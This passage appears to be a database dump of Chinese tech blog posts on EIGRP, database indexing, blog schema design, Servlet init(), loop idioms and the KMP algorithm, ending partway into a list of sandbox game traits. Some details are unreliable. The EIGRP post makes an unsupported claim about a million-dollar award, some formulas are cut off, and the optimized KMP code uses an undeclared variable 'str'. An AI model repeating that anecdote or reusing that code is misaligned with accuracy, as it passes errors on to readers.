关系的维护构成了EIGRP最底层的独立机制，之所以叫独立是因为其与上面的其他机制互不影响（除非关系中断）。所以，学会了hello包之后再学习网络收敛机制就不用考虑hello的工作原理了，更不用担心hello机制的影响让上层机制产生bug！\r\n\r\nEIGRP里面的所有机制包括底层机制，他们正常工作的根本前提是EIGRP程序本身完好无损！！之后提到的环路、短路、次优等bug都是EIGRP程序（机制）造成的，而如果程序本身被串改或染上病毒，那么就不是改善机制所能解决的了。针对这个问题，一个思科内部员工建议，通过思科路由器的操作系统（IOS）来监控这个可能出现的bug，一旦发现则禁用EIGRP，并且向邻居发送一个goodbye消息，意指“我已经挂了”。这是个开创性的发明，那个提出者也获得了百万美金，如果说EIGRP是一款软件，那么goodbye则是一个游离在应用软件与操作系统之间的“高权限”程序。\r\n\r\n接下来到了EIGRP的精髓。EIGRP的下一张表是拓扑表。拓扑表是最重要的一张表，它是EIGRP核心算法DUAL的数据库，就好比cpu与内存的关系。拓扑表中存放着所有邻居发来的路有信息，注意，拓扑表中所有条目最好按照不同的目标网络来分类而不是按照不同的邻居，即抵达同一个目的地的所有路径的唯一区别是拥有不同的下一跳，这样有利于理解之后的选路机制。 \r\n\r\n   ',1851),(50,'我眼中的EIGRP (下)','2018-02-02 09:59:08',1,0,2,'DUAL（弥散更新算法）中的防环核心公式是：FC=(AD\r\n\r\n细心的同学会发现，这个公式是有瑕疵的。在默认情况下（即不做任何修改的情况），局域网中的环路都将被避免。与此同时，有些开销足够大的非环路次优路径因为不满足FC公式而被排出备份路径。\r\n\r\n针对这个问题，思科提供了两种解决方案。第一种，利用EIGRP自身的查询机制，当拓扑表中没有备份路径而此时主路径失效后，路由器会主动向邻居发送查询消息，这时那些曾经被“看不起”的次优路径就会被高度重视，变成最佳路径。第二种，手动修改度量值参数（即使连路两段度量值不一样也不影响邻接关系）使总度量值满足公式，这是目前最完美的解决方案，因为它从根源上解决问题，避免了“为了debug衍生出新bug”的尴尬。\r\n\r\n再然后到了EIGRP的故障倒换机制，也是EIGRP独一无二的地方。大家研究故障倒换一定要养成“钻牛角尖”的习惯，虽然学IT最忌讳走极端，但是他是不包含网络安全这个领域的。好，在各种想象的应用场景中，只要是链路就将它幻化成含有二层交换机的多分支网段，只要是一个部门网段就让他有多个网关路由器。\r\n\r\n时间顺序上，当一个网段或其中一根链路出现故障后，相关的路由器就会立刻知道并且从拓扑表中搜寻有无备份路径，如果没有则被触发一个错误报告（路由更新）给所有的邻居“从我这里无法到达这个网络”，同时再向所有邻居发送一个查询消息以查找可到这个网络的邻居。收到报错包的路由器自然认为这条路径已断，然后选择备份或者发送查询。\r\n\r\n不知是否发现，这个查询机制又带来一个问题：FC本来就是为了避免环路才排除那些路径，现在查询机制又直接接受那些路径，如果她们真的是环路该怎么办？答案是：这种情况在现实生活中很少出现，通常全互联的企业网络就已经将环路路径远远甩在备份路径的考虑之后，也就是说通常备份路径是足够多的。如果极端情况，也就是变态的网络规划下出现了这个环路，那不好意思，只能人为的去避免环路，比如利用stub和ACL。\r\n\r\n然后问题又来了：那这个查询机制还有个卵用？！哎，怎么说呢，送给大家一个哲学吧：程序员并不聪明，大多数情况只会按部就班按照人类的逻辑开发程序，有时也会把生活中的一些错误习惯带到协议中，因为过于追求算法的完美和精炼的代价是消耗算法的逻辑框架，虽然节省了网络开销但不利于人的学习思考也不能带来等价的商业价值。\r\n\r\n更有甚者,有些知识点，比如不等价负载均衡的值，是个CCIE一眼就能看出其设计的很不尽人意，完全可以用更简单的方式表达,但思科非要这么做,故意将其复杂化，让外行人（比如客户）看不懂以体现其技术的深奥！路由器交换机配置的命令行完全可以通过图形化界面代替，鼠标点点选选就可以完成的配置非要设计的像编程一样枯燥难懂，思科早年也提出过这样的概念但是居然被整个行业一票否决…无奈之余我只能将之看成是行业的恶性保护以及标准化的潜规则。试想，当人人都轻而易举学会图形化的网络配置，购买一款人性化软件就能解决所有网络问题，那还要我们CCIE做什么？！不知道大家听明白了没?。。\r\n\r\n既然提到了,就顺便说说不等价负载均衡吧.有一个知识点原来困惑了我很久,后来才发现就是个笑话,那就是不等价负载均衡值的计算公式=[FD/FDmin]\r\n\r\n1(向下取整再加一,也就是向上取整).后来看到不负均的省查条件里有一句话叫:不等价负载均衡值乘以FDmin必须大于次有路径的FD.我想了半天想不明白,最后在草稿纸上重新推导了一遍这个公式发现,原来这句话已经由前面的计算公式决定了!一句废话为啥还要写在上面啊,再说这个值本来也没什么用!哎说了这么多我也不需要再说什么了.\r\n\r\n很多初学者抱怨说,不仅不负均值是个鸡肋,它本身也无法根据特定网络筛选实际需要均衡负载的路径.前者我认同but后者其实可以灵活调整因为你忽略了它的一个审查条件,就是要满足坑爹的FC——那个配合查询机制一起防环的战斗鸡肋.你可以手动或用偏移列表修改路径度量值让不想负载的路径被排除在外即可,也可用不负均值来筛选稍麻烦一点.\r\n\r\n吐槽了这么多EIGRP的缺点,最后还是回到主题吧,谈谈网络的层次化架构.虽然ospf和is-is将之发扬光大,但eigrp作为”口口相传路由协议”的代表利用汇总也可以实现层次化、部门化（区域化）的设计:核心层连接不同部门，以部门为单位的局域网各自在同一个大的主类网或子类网中,部门边界做汇总送给核心层,从而有效提高了网络的规划管理能力和对故障的防御力.\r\n\r\n网络层次化架构也映射了文章开头提到的学习方法——框架式学习.虽然随着文章的深入这栋大楼不知倒了多少层,但仍然希望它依旧不影响作者和读者的热情.本文没有具体的参数,只有满满的逻辑,因为我的初衷是献给大家一个全新的看待问题的角度,希望大家能理解它,不理解也没关系,这种奇葩的视角本来就无法普及.总之要想全面了解EIGRP的具体参数和更详细的原理如关于三张表四条公式五个消息的还请扭正三观并transfer\r\n\r\nto正版书籍~',2067),(51,'谈谈索引的哲学思想','2018-02-02 15:12:58',1,0,10,'索引：（index）是计算机世界中的一个常见的概念，抛开计算机不谈，在书籍、生活中也常常出现索引或者他的变种。\r\n\r\n比如一本技术类的专业书籍中，通常在最后几页，参考文献之前会有一个索引栏目，往往是通过关键词来查找页数（关键词又通过首字母来排序）。其实本质上，首页的目录也是一种索引，索引就是目录。\r\n\r\n因此，索引的概念上升到哲学的逻辑，在中文百科中，对于索引的定义是：“索引提供指向存储在表的指定列中的数据值的指针”，虽然这是针对数据库的，但是逻辑依稀可见，所以本文从三处来阐述索引的作用。\r\n\r\n\r\n\r\n>————书目录————\r\n\r\n每本书都有目录，目录是通过页码的顺序显示每一章每一节的内容。但是目录是一种很特殊的索引，因为读者通常不是为了看第几页而去看第几页是哪一篇文章，所以读者通常情况下（指的是面对一本新书，从来没看过）都是从第一页看是看起，等到熟悉了整个书的布局后，目录的作用才大了起来。\r\n\r\n>————名词索引————\r\n\r\n相比较书的目录，书后的名词索引高效的多，说过，通常专业书籍才有名词索引，因为读者都是相关领域的人，对所有的名词都熟悉，因此这个“目录”是按照关键词的首字母或拼音来排序的，否则如果按页码排序所有单词，查找起来的多难。\r\n\r\n>————数据库主码————\r\n\r\n一般数据库默认都会为主键生成索引。主键通常是not null的递增编号，可以类比书的目录。因为是有序的，数据库检索起来很快。\r\n\r\n>————数据库索引表————\r\n\r\n索引表就是用来快速查找关键词，用来提高效率的一种解决方案，如果说主码是一种根据编号来查找数据的结构，那么就有其他需求比如想要通过“居住地”来查找某个人（请大家自行脑补一张数据库表格，比如学生信息表）。如果只有一次需求，那么遍历“居住地”那一列就行了，如果需求多了呢，这时就需要将“居住地”那一列给索引出来，通过命令CREATE INDEX index_name ON table(column(length))，数据库会自动将那一列的关键词分门别类的罗列出来并且按照某个标准排序，形成一张新的表，这样用户查找某一城市的人就方便多快多拉。\r\n\r\n>————搜索引擎关键词————\r\n\r\n搜索引擎很复杂，首先引擎要下载互联网上100+亿张网页，每张网页都要搜索词库中几十万个关键词，现在有一张表了，有两列（只是最简单的情况下），第一列是网页地址，第二列是包含那些关键词。但这张表没卵用啊，用户搜索的是文本，通过关键词查找网页，很显然这张表是通过网页寻找关键词的，那么就要做一个转换，索引关键词到一张新表：第一列是关键词，第二列是包含那些网址。同时肯定也要对关键词排序，以增加查找速度。\r\n\r\n>————文件系统中的索引————\r\n\r\n文件系统非常丰富，例如常见的ntfs和fat系统的头部信息都储存了大量的文件信息，如文件名，大小，物理指针，目录地址，修改日期，创建日期，默认打开方式，等等等数不胜数的属性，同理，文件系统头部这张大表各异根据各列建立各种索引子表，同时利用折半、插值、跳步等查找法快速检索文件。\r\n\r\n\r\n\r\n\r\n\r\n以上就是索引在IT以及现实生活中的几个应用，可以看到一些哲学性的共性，比如索引可以看成一张表，索引表都有输入和输出，输入通常是单一的，输出可以多个项，还有索引的输入项那一列一定要排序。',1395),(52,'漫谈博客架构3---如何设计文章分类和标签?','2018-02-03 11:55:57',0,0,12,'几乎在所有web项目中，都涉及文章分类和标签的设计，应该说这是一个比较常见、典型的案例。站长并不保证我的思路就是最好的，只是分享出来大家一起交流一下，互相促进与提高。\r\n\r\n我们假设的开发项目是一个博客系统，最核心的部分就是与文章相关的，那么我们今天讨论如何设计博客系统的文章分类和标签。\r\n\r\n1、首先，分类和标签都是要和具体的文章相关联的，当然也可能一些文章既没有分类也没有标签，这一点是大家在写查询的时候容易疏忽的地方。因为我们的第一感觉就是，在查询文章列表的时候关联分类表，查出所有的文章和分类，对应关系一般是文章表的分类id对应分类表的id，使用where子句进行限定。这里就存在一个问题了，由于使用了where子句，那么只能查询有分类的文章，而没有分类的文章就查询不到了。这时候怎么办？应该使用连接查询，left\r\njoin，这要没有分类的文章，在文章分类id那一栏会显示null。通常我们只使用left join，而很少使用right join。\r\n\r\n2、一般，一篇文章最好只对应一个分类，当然如果你想要对应多个分类也可以。但站长并不提倡，文章在多个分类中重复会给人很不专业的感觉，即使有些文章可能确实设计到多方面的内容，那么你应就其中的侧重点来分类。而标签就不一样了，一篇文章可能有多个标签。这就意味着我们无法靠一个sql语句既查出所有文章的分类和标签，又做到查询结果中的文章id不重复。通常我们需要把查询出来的结果直接循环出来，那么这个结果一般是二维数组，第二维的都存储了唯一一篇文章的相关信息。但是，标签和文章是多对一的关系，多个标签对应一篇文章，如果你只用一条sql语句的话，那么我们查询出来的结果，当然也是多行，这不符合我们目标数据的要求。应此，需要在查询完文章和分类之后，在前面结果的基础上再查询一次文章标签，把两次的结果结合起来，存在数组中，这是对应文章列表页面的查询方法。对于具体文章页面，可以分两次查询。\r\n\r\n好了，还没有给出具体的数据库设计，就先说了如何查询结果，相信大家也看烦了，下面就举例说明：\r\n\r\n一、文章表：post，字段如下：\r\n\r\nid【唯一标识】，aid【作者id】，title【标题】,content【内容】，cid【分类id】\r\n\r\n二、分类表，category，字段如下：\r\n\r\nid【唯一标识，与post表的cid关联】,name【分类名】\r\n\r\n三、标签表，tag，字段如下：\r\n\r\nid【唯一标识】，name【标签名】\r\n\r\n四、标签与文章对应关系表，tag_relationship，字段如下：\r\n\r\nid【唯一标识】，postid【文章id，与post表的id关联】，tagid【标签id，tag表的id关联】\r\n\r\n有朋友可能会问：为什么要单独用一个表来存储文章与标签的对应关系，为什么不可以直接在tag表中增加一个文章id字段呢，比如：\r\n\r\ntag表：\r\n\r\nid，postid，name\r\n\r\n这样做的话，并不是不可以，但是，由于一篇文章对应多个标签，所以name字段的值会出现很多重复，比如一篇文章，假设文章id为1，有2个标签，php和mysql，那么在tag表会这样存储：\r\n\r\nid:1,postid:1,name:php\r\n\r\nid2,postid:1,name:mysql\r\n\r\n另一篇文章，假设id为2，有2个标签，也是php和mysql，那么在tag表中它会这样存储：\r\n\r\nid:3,postid:2,name:php\r\n\r\nid4,postid:2,name:mysql\r\n\r\n大家很快就发现了问题，这样的设计name字段也就是标签的名称在同一张表中可能会大量重复。但是这样设计的好处是，如果你要查询一个标签下有多少篇文章，只要单独查这个表就可以了，比如要查询含有php标签的文章有多少篇，只需要select\r\ncount(name) from tag where\r\nname=’php’,就可以查出来。不好的地方是，如果要查询所有标签的集合，使用这种设计需要使用group by\r\nname语句来去除重复的行。如果用之前的那种，只需要select * from\r\ntag就可以了。一时之间，好像不太好取舍。这两种设计都会有数据冢余，第一种tag_relationship表中，存在tagid字段的重复；而这两种设计又都有各自的好处。那么我们到底该怎么选择呢？站长也说不好，所以无法为大家下结论。但是站长在研究wordpress数据结构的时候，发现wp是采用的单独建表存储文章与标签对应关系的方式。\r\n\r\n另外，如何设计有时候也是取决具体功能的需求的，所以这个问题就留给大家一起来讨论吧~\r\n\r\n转自：《第一php网》',1958),(53,'Servlet的init()方法','2018-02-03 20:28:32',3,1,7,'今天稍微学习了一下 Servlet，Servlet 主要有以下几个方法： \r\n1) destroy() \r\n2) getServletConfig() \r\n3) getServletInfo() \r\n4) init(ServletConfig arg0) \r\n5) service(ServletRequest arg0, ServletResponse arg1)\r\n\r\ndestroy 和 service 方法的调用时刻很明显，关键这个 init 方法的调用时刻不是很清楚，遂经过百度和一番实验后得出了结论。\r\n\r\ninit 方法的执行时刻其实与 servlet 的配置有关，可以看到以下代码的load-on-startup结点，如果结点的值大于等于 0，则在 Servlet 实例化的时候执行，间隔时间由具体的值决定，值越大，则越迟执行。如果小于 0 或者没有配置，则在第一次请求的时候才同步执行 ， 注意 init 方法只执行一次\r\n\r\n>servlet>\r\n    servlet-name>helloServlet/servlet-name>\r\n    servlet-class>javaweb.HelloServlet/servlet-class>\r\n    load-on-startup>1/load-on-startup>\r\n/servlet>\r\nservlet-mapping>\r\n    serlvet-name>helloServlet/servlet-name>\r\n    url-pattern>/hello/url-pattern>\r\n/servlet-mapping>\r\n\r\n----\r\n##总结\r\ninit 方法是随 Servlet 实例化而被调用的，因为 load-on-startup 就是用来设置 Servlet 实例化时间的。\r\n\r\n因此，init 方法执行的时刻有两种：\r\n\r\n（1） load-on-startup 的值大于等于0，则伴随 Servlet 实例化后执行。\r\n\r\n（2） load-on-startup 的值小于0 或者 不配置， 则在第一次 Servlet 请求的时候执行。\r\n\r\n---\r\n######init方法经常用于模型层(model层)的初始化,将数据库中的原始数据生成一个个javabean,并且存入application对象中',1003),(54,'\'\'进位-判断-执行\'\'的通用思想','2018-02-04 16:16:56',4,1,21,'##进位--判断--执行\r\n这是我自己发明的一个规范,我觉得很方便实用,特意献给大家XD\r\n什么意思捏?\r\n每次写循环的时候,尤其是for循环(不是foreach)时,总是要考虑那个标志变量\"i\"到底从0开始还是从1开始,每次自增长是在循环前还是循环后,亦或是在中间位置,然后每次判断何时跳出循环的时候也要纠结一会.\r\n\r\n---\r\n问题就是这个思考的时间我觉得不值,应该像while循环那样直接想出代码.这个问题困到了多时直到java给了我灵感:\r\n###ResultSet.next()\r\n首先是jdbc中resultset.next()函数,其中的标志变量,也就是上面说到的i,起始位置在第一行记录的前面一个,也就是第0行,每次调用这个函数,标志位进一个整数,然后判断这里行存不存在,如果存在则取出数据.\r\n###BufferedInputStream.readline(byte[])\r\n然后是这个方法,常用于从字符文件中读取每一行,每次调用这个方法的时候读取的都是上一次读取行的下一行,因为和next()一样,这里也有用于判断的标志位,原理和上面一样.\r\n\r\n---\r\n所以总结出了这样一个 \r\n>进位 -- 判断 -- 执行 \r\n\r\n的三部曲:对于循环的列表,标志位总是从第0个位置开始(这个位置是空的),然后每一次先进标志位,然后对于这个标志位所指向的条目进行判断是否溢出,因为如果这个位置已经超出列表,然后执行的话,很容易出现NullPointerException,或者出现更严重故障,所以先要拿这个标志指针来试探一下这一条是否合适,当然了,不仅是防止循环溢出,还有其他的业务逻辑需要对每一条记录判断类型再作出相应的操作,这样一来,标志位的作用就大了.最后执行相关的业务操作.\r\n\r\n举两个栗子把:\r\n###JSP循环输出表格\r\n规范的思考模型可以节省你很多时间,输出动态的table关键就是什么时候输出\"tr\",有了以上的思维,我们可以给每一个td编号,从1开始递增,假如有5列,就是要在编号1,6,9,14之前和5,10,15,20之后输出tr标签,那么我们标志位i就要从0开始,以此类推,判断输出.\r\n###模拟鼠标点击任务\r\n有时候我们想完成一些自动化的任务,但一时又找不到能够用于\"开挂\"的标准库,只能模拟外设操作啦,比如像依次点击windows或unix的资源管理器中的每一个文件,就需要进位判断执行的模型来控制鼠标的坐标,如果点错了位置后果可就难说了.\r\n\r\n\r\n真的是不够聪明,才需要这种小技巧来提高效率...',1072),(55,'KMP算法完整教程 (上)','2018-02-05 19:55:46',0,0,3,'#KMP算法完整教程\r\n- 全称:                               Knuth_Morris_Pratt Algorithm(KMP算法)\r\n\r\n- 类型:                               高级检索算法\r\n\r\n- 功能:                               字符串匹配查找\r\n\r\n- 提出者:                           D.E.Knuth(克努兹),J.H.Morris(莫瑞斯),V.R.Pratt(普莱特)\r\n\r\n- 所属领域:                        数据结构学\r\n\r\n- 应用场景:                        统计软件\r\n\r\n- 时间复杂度:                    O(m+n)\r\n##一。原始匹配字符串方法\r\n        以前,我们要肉眼在一个长字符串中寻找一个关键字词,比如在word文档中找一个单词,我们的世界观决定的方法论就是穷举法:挨个搜寻单词的第一个字母,每找到一个就定位然后匹配下一个字母,当匹配错误时就会放弃之前的匹配,沿着刚才的进度继续搜索首字母.\r\n\r\n\r\n\r\n       这种方法也叫作”暴力字符匹配”,和早期计算机检索算法共享着同样的思想,其中被检索的字符串数据库叫做”主串”,检索的字符串叫”模式串”.名字很怪异我也没办法.\r\n\r\n        于是依照这种算法我们可以编写一个程序来实现它:\r\n\r\n```\r\nint Index(SString S,SString T,int pos)\r\n\r\n{\r\n\r\n  i=pos;j=1;\r\n\r\n  while(i<=S[0]&&j<=T[0])\r\n\r\n  {\r\n\r\n    if(S[i]==T[j]){++i;++j;}\r\n\r\n    else{i=i-j+2;j=1;}//主串指针回溯重新开始下一趟匹配.\r\n\r\n  }\r\n\r\n  if(j>T[0])return i-T[0];\r\n\r\n  else return 0;\r\n\r\n}\r\n\r\n//返回模式串T在主串S第pos之后部分中的位置，若不存在则函数值为0.\r\n```\r\n\r\n这里要注意i和j的指针回溯问题，注意细节，具体如下图：\r\n![这里写图片描述](http://img.blog.csdn.net/20180205195258052?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2l0aHViXzM4ODg1Mjk2/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast)\r\n然后问题就来了，这种算法在特定的情况下暴露出一些问题，在时间效率上不是很完美，因为它毕竟是一种穷举法，也符合人们的第一感觉，但是并不是最优的解决方案。比如说当在模式串中比较到第5个字符时才发现不匹配，那么之前四个字符都完全匹配，下一步就不需要再把模式串一位一位的向后移，而很可能直接把模式串向后移动四位就可以了，省去了三次比较，比如模式串是“aceddfaa”，主串是“acedabcd”的情况。\r\n\r\n##二。初代KMP算法\r\n\r\n       针对上面那个例子，我们可以展开思考，如果模式串匹配到第j个字符不匹配的话，接下来只需要在主串中这个位置从模式串中第f（j）的字符开始比较就行了，而不需要从第一个开始。而且f（j）只与模式串中第j个字符以前的所有字符有关。好了，这个f（j）我们用一个数组来存放，就是next【j】。求出next【j】就是KMP算法的核心。可以看出next【j】的值越小越好，优化的效率越高。\r\n\r\nKMP的next数组求法是很不容易搞清楚的一部分，也是最重要的一部分。我这篇文章就以我自己的感悟来慢慢推导一下吧！保证你看完过后是知其然，也知其所以然。\r\n\r\n如果你还不知道KMP是什么，请先阅读上面的链接，先搞懂KMP是要干什么。\r\n\r\n下面我们就来说说KMP的next数组求法。\r\n\r\nKMP的next数组简单来说，假设有两个字符串，一个是待匹配的字符串strText,一个是要查找的关键字strKey。现在我们要在strText中去查找是否包含strKey，用i来表示strText遍历到了哪个字符，用j来表示strKey匹配到了哪个字符。\r\n\r\n如果是暴力的查找方法，当strText[i]和strKey[j]匹配失败的时候，i和j都要回退，然后从i-j的下一个字符开始重新匹配。\r\n\r\n而KMP就是保证i永远不回退，只回退j来使得匹配效率有所提升。它用的方法就是利用strKey在失配的j为之前的成功匹配的子串的特征来寻找j应该回退的位置。而这个子串的特征就是前后缀的相同程度。\r\n\r\n所以next数组其实就是查找strKey中每一位前面的子串的前后缀有多少位匹配，从而决定j失配时应该回退到哪个位置。\r\n\r\n我知道上面那段废话很难懂，下面我们看一个彩图：\r\n![这里写图片描述](http://img.blog.csdn.net/20180205195353605?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2l0aHViXzM4ODg1Mjk2/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast)\r\n这个图画的就是strKey这个要查找的关键字字符串。假设我们有一个空的next数组，我们的工作就是要在这个next数组中填值。',2375),(56,'KMP算法完整教程 (下)','2018-02-05 19:55:46',1,0,3,'下面我们用数学归纳法来解决这个填值的问题。\r\n\r\n这里我们借鉴数学归纳法的三个步骤（或者说是动态规划？）：\r\n\r\n- 1、初始状态\r\n\r\n- 2、假设第j位以及第j位之前的我们都填完了\r\n\r\n- 3、推论第j+1位该怎么填\r\n\r\n初始状态我们稍后再说，我们这里直接假设第j位以及第j位之前的我们都填完了。也就是说，从上图来看，我们有如下已知条件：\r\n```\r\nnext[j] == k;\r\n\r\nnext[k] == 绿色色块所在的索引;\r\n\r\nnext[绿色色块所在的索引] == 黄色色块所在的索引;\r\n```\r\n\r\n这里要做一个说明：图上的色块大小是一样的（没骗我？好吧，请忽略色块大小，色块只是代表数组中的一位）。\r\n\r\n我们来看下面一个图，可以得到更多的信息：\r\n![这里写图片描述](http://img.blog.csdn.net/20180205195850445?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2l0aHViXzM4ODg1Mjk2/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast)\r\n>1.由\"next[j] == k;\"这个条件，我们可以得到A1子串 == A2子串（根据next数组的定义，前后缀那个）。\r\n\r\n>2.由\"next[k] == 绿色色块所在的索引;\"这个条件，我们可以得到B1子串 == B2子串。\r\n\r\n>3.由\"next[绿色色块所在的索引] == 黄色色块所在的索引;\"这个条件，我们可以得到C1子串 == C2子串。\r\n\r\n>4.由1和2(A1 == A2，B1 == B2)可以得到B1 == B2 == B3。\r\n\r\n>5.由2和3(B1 == B2， C1 == C2)可以得到C1 == C2 == C3。\r\n\r\n>6.B2 == B3可以得到C3 == C4 == C1 == C2\r\n\r\n上面这个就是很简单的几何数学，仔细看看都能看懂的。我这里用相同颜色的线段表示完全相同的子数组，方便观察。\r\n\r\n \r\n\r\n接下来，我们开始用上面得到的条件来推导如果第j+1位失配时，我们应该填写next[j+1]为多少？\r\n\r\nnext[j+1]即是找strKey从0到j这个子串的最大前后缀：\r\n\r\n#######：(#:在这里是个标记，后面会用)我们已知A1 == A2，那么A1和A2分别往后增加一个字符后是否还相等呢？我们得分情况讨论：\r\n\r\n- (1)如果str[k] == str[j]，很明显，我们的next[j+1]就直接等于k+1。\r\n\r\n　　用代码来写就是next[++j] = ++k;\r\n\r\n- (2)如果str[k] != str[j]，那么我们只能从已知的，除了A1，A2之外，最长的B1，B3这个前后缀来做文章了。\r\n\r\n那么B1和B3分别往后增加一个字符后是否还相等呢？\r\n\r\n由于next[k] == 绿色色块所在的索引，我们先让k = next[k]，把k挪到绿色色块的位置，这样我们就可以递归调用\"#：\"标记处的逻辑了。\r\n\r\n \r\n\r\n由于j+1位之前的next数组我们都是假设已经求出来了的，因此，上面这个递归总会结束，从而得到next[j+1]的值。\r\n\r\n \r\n\r\n我们唯一欠缺的就是初始条件了：\r\n\r\nnext[0] = -1,  k = -1, j = 0\r\n\r\n另外有个特殊情况是k为-1时，不能继续递归了，此时next[j+1]应该等于0，即把j回退到首位。\r\n\r\n即 next[j+1] = 0; 也可以写成next[++j] = ++k;\r\n\r\n 这里我们用Java来描述：\r\n ```\r\n public static int[] getNext(String ps)\r\n\r\n{\r\n\r\n    char[] strKey = ps.toCharArray();\r\n\r\n    int[] next = new int[strKey.length];\r\n\r\n\r\n\r\n    // 初始条件\r\n\r\n    int j = 0;\r\n\r\n    int k = -1;\r\n\r\n    next[0] = -1;\r\n\r\n \r\n\r\n    // 根据已知的前j位推测第j+1位\r\n\r\n    while (j < strKey.length - 1)\r\n\r\n    {\r\n\r\n        if (k == -1 || strKey[j] == strKey[k])\r\n\r\n        {\r\n\r\n            next[++j] = ++k;\r\n\r\n        }\r\n\r\n        else\r\n\r\n        {\r\n\r\n            k = next[k];\r\n\r\n        }\r\n\r\n    }\r\n\r\n\r\n\r\n     return next;\r\n\r\n}\r\n\r\n```\r\n##三。KMP算法的优化和改进\r\n\r\n\r\n\r\nKMP算法是可以被进一步优化的。\r\n\r\n我们以一个例子来说明。譬如我们给的P字符串是“abcdaabcab”，经过KMP算法，应当得到“特征向量”如下表所示：\r\n![这里写图片描述](http://img.blog.csdn.net/20180205200048696?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2l0aHViXzM4ODg1Mjk2/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast)\r\n但是，如果此时发现p(i) == p(k），那么应当将相应的next[i]的值更改为next[k]的值。经过优化后可以得到下面的表格：\r\n![这里写图片描述](http://img.blog.csdn.net/20180205200107143?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2l0aHViXzM4ODg1Mjk2/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast)\r\n- （1）next[0]= -1 意义：任何串的第一个字符的模式值规定为-1。\r\n\r\n- （2）next[j]= -1 意义：模式串T中下标为j的字符，如果与首字符\r\n\r\n相同，且j的前面的1—k个字符与开头的1—k\r\n\r\n个字符不等（或者相等但T[k]==T[j]）（1≤k\r\n\r\n如：T=”abCabCad” 则 next[6]=-1，因T[3]=T[6]\r\n\r\n-（3）next[j]=k 意义：模式串T中下标为j的字符，如果j的前面k个\r\n\r\n字符与开头的k个字符相等，且T[j] != T[k] （1≤k\r\n\r\n即T[0]T[1]T[2]。。。T[k-1]==\r\n\r\nT[j-k]T[j-k+1]T[j-k+2]…T[j-1]\r\n\r\n且T[j] != T[k].（1≤k\r\n\r\n- (4) next[j]=0 意义：除（1）（2）（3）的其他情况。\r\n\r\n\r\n\r\n于是乎我们修正的NEXT数组的求法如下：\r\n```\r\npublic static int[] getNext(String ps)\r\n\r\n{\r\n\r\n    char[] strKey = ps.toCharArray();\r\n\r\n    int[] next = new int[strKey.length];\r\n\r\n\r\n\r\n    // 初始条件\r\n\r\n    int j = 0;\r\n\r\n    int k = -1;\r\n\r\n    next[0] = -1;\r\n\r\n \r\n\r\n    // 根据已知的前j位推测第j+1位\r\n\r\n    while (j < strKey.length - 1)\r\n\r\n    {\r\n\r\n        if (k == -1 || strKey[j] == strKey[k])\r\n\r\n        {\r\n\r\n            // 如果str[j + 1] == str[k + 1]，回退后仍然失配，所以要继续回退\r\n\r\n            if (str[j + 1] == str[k + 1])\r\n\r\n            {\r\n\r\n                next[++j] = next[++k];\r\n\r\n            }\r\n\r\n            else\r\n\r\n            {\r\n\r\n                next[++j] = ++k;\r\n\r\n            }\r\n\r\n        }\r\n\r\n        else\r\n\r\n        {\r\n\r\n            k = next[k];\r\n\r\n        }\r\n\r\n    }\r\n\r\n\r\n\r\n     return next;\r\n\r\n}\r\n```\r\n      好了，以上就是KMP算法的所有内容，我们可以看出，KMP算法的关键就是：利用匹配失败后的信息，利用递归的思想为每一个字符算出一个“特征值”。最后，KMP算法适合在字符种类很稀疏的情况下适用：仅当模式与主串之间存在许多“部分匹配”的情况下才显得比“暴力匹配”快，但是如果模式串中有太多相同的字符，就会略微降低KMP的优化效果。KMP算法还有一个进步特点就是：指示主串的指针不需要回溯，对主串仅需从头至尾扫描一遍。\r\n\r\n\r\n\r\n（如需转载请标明出处）',4045),(57,'沙盒大作的一些共性大盘点','2018-02-05 20:10:27',1,0,6,'###极品游戏制作时的考虑哪些要素?\r\n>不知不觉入坑Steam已近6年，虽然说Steam的毒性让很多人走向一条不归路，但是想我这样即使“中毒”还是很快乐很感恩的。那么本期文章就谈谈我对其中一些优秀作品的共性的一个总结，共列举了共31个特性，其中甚至还有一些还未实现但我很期望的新特性（一定要看到最后哦）。这些特性共同成就了一部部优秀的游戏作品，让他们走向IGN的排行榜首页。本文全为知识共享，没有商业意图，那下面就开始吧（排名不分先后）。\r\n\r\n\r\n\r\n\r\n\r\n####1.3D画面\r\n\r\n一个主流的电子游戏，你首先得是3D游戏吧，至少也得是2.5D，因为方向的限制有助于玩家控制视角，虽然2D游戏也有很多优秀的作品，但是如题，想要做出一款“与世无争”的极品游戏，需要很大的可扩展性，也只有3D能对得起用户。\r\n\r\n\r\n\r\n####2.大地图\r\n\r\n现在沙盒游戏的大作，如The Witcher巫师系列和Unlimited Test Drive无限试驾系列都喜欢标榜自己是大地图，高自由度，现在面积小于一个南京城的大型游戏都不好意思拿出手。的确，宏达的游戏地图面积对玩家而言是一种诱惑，超大的游戏面积就是一个小世界，玩家渴望在其中自由探索和旅行，以完成在现实世界中无法完成的欲望。\r\n\r\n\r\n\r\n####3.美丽的风景\r\n\r\n美丽的风景通常意味着广阔的视角。每个人都渴望自由，抵制束缚，每个人都有不同程度的“封闭空间恐惧症”。多一些开阔空间会很好地提高玩家的幸福感：广阔的山川平原，晴朗的蓝天和大块的白云，一望无际的大海和地平线。不仅能欣赏到其风景（很多玩家在游戏中“自驾游”单纯为了看风景），更能一定程度增大对“大地图”的感受。\r\n\r\n\r\n\r\n####4.宏伟的物体\r\n\r\n最近玩Final Fantasy最终幻想系列，深切感受到什么叫与百米巨兽零距离接触。不得不说FF系列美工是很不错的。巨大的物体，如巨大的动物，巨大的岩石，巨大的雕像，巨大的高楼，巨大的遗迹，巨大的月亮，巨大的湖泊，无不给人一种视觉上的震撼。\r\n\r\n\r\n\r\n####5.与环境互动\r\n\r\n这一点非常非常非常重要，由于涉及到碰撞检测，这是增强虚拟世界真实程度的必备要素。Elder 